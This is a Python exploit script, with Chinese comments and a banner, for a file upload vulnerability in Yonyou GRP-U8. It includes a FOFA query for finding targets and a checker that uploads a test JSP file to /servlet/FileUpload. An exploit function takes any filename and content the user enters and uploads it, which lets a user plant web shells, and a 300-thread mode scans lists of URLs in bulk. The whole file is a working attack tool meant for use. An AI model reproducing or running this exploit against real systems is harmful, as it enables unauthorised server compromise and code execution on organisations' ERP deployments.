# FOFA：app="用友-GRP-U8"
import requests,argparse,time,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 解除警告
GREEN = '\033[92m' #输出颜色
RESET = '\033[0m'
proxies = { 
       "http": "http://127.0.0.1:8080", 
       "https": "http://127.0.0.1:8080" 
       }
def banner():
	banner = """

	██████╗██╗  ██╗ ██████╗ ███████╗███████╗███╗   ██╗ ██╗
██╔════╝██║  ██║██╔═══██╗██╔════╝██╔════╝████╗  ██║███║
██║     ███████║██║   ██║███████╗█████╗  ██╔██╗ ██║╚██║
██║     ██╔══██║██║   ██║╚════██║██╔══╝  ██║╚██╗██║ ██║
╚██████╗██║  ██║╚██████╔╝███████║███████╗██║ ╚████║ ██║
 ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═══╝ ╚═╝
                                     info:用友GRP-U8 FileUpload 文件上传漏洞
	"""
	print(banner)
def poc(target):
	payload_url = "/servlet/FileUpload?fileName=bivlegk.jsp&actionID=update"
	url = target + payload_url
	headers={
		'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0',
		'Content-Length': '24',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
		'Accept-Encoding': 'gzip, deflate',
		'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
		'Connection': 'close',
		'Content-Type': 'multipart/form-data; boundary=---------------------------32840991842344344364451981273',
		'Origin': 'null',
		'Upgrade-Insecure-Requests': '1'
	}

	data = '<% out.println("123");%>'

	try:
		res = requests.get(target,verify=False)
		res1 = requests.post(url=url,headers=headers,data=data,timeout=5,verify=False)
		if res.status_code == 200:
			if res1.status_code == 200 and res1.text == "":
				print(f"{GREEN}[+]该url存在文件上传漏洞：{target} {RESET}")  # 访问/R9iPortal/upload/bivlegk.jsp
				with open("result.txt","a",encoding="utf-8") as f:
					f.write(target+"\n")
				return True
			else:
				print(f"[-]该url不存在文件存在漏洞：{target}")
				return False
		else:
			print(f"该url连接失败：{target}")
	except Exception as e:
		print(f"[*]该url出现错误：{target}+{e}")


def exp(target):
	print("------------------------正在进行漏洞利用----------------------------------")
	time.sleep(3)
	fileName = input("请输入上传的文件名称：")
	code = input("请输入文件的内容：")
	payload_url = f"/servlet/FileUpload?fileName={fileName}&actionID=update"
	url = target + payload_url
	headers={
		'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0',
		'Content-Length': '24',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
		'Accept-Encoding': 'gzip, deflate',
		'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
		'Connection': 'close',
		'Content-Type': 'multipart/form-data; boundary=---------------------------32840991842344344364451981273',
		'Origin': 'null',
		'Upgrade-Insecure-Requests': '1'
	}
	data = f"{code}"
	res = requests.post(url=url,headers=headers,data=data,verify=False)
	if res.status_code == 200:
		print(f"{GREEN}[+]文件上传上传，请访问{target}"+f"/R9iPortal/upload/{fileName} {RESET}")
	else:
		print(f"[-]利用失败")

def main():
	banner()
	parser = argparse.ArgumentParser()
	parser.add_argument("-u","--url",dest="url",type=str,help="please write link")
	parser.add_argument("-f","--file",dest="file",type=str,help="please write file\'path")
	args = parser.parse_args()
	if args.url and not args.file:
		if poc(args.url):
			exp(args.url)
	elif args.file and not args.url:
		url_list = []
		with open(args.file,"r",encoding="utf-8") as f:
			for i in f.readlines():
				url_list.append(i.strip().replace("\n",""))
		mp = Pool(300)
		mp.map(poc,url_list)
		mp.close()
		mp.join()
	else:
		print(f"\n\tUage:python {sys.argv[0]} -h")

if __name__ == "__main__":
	main()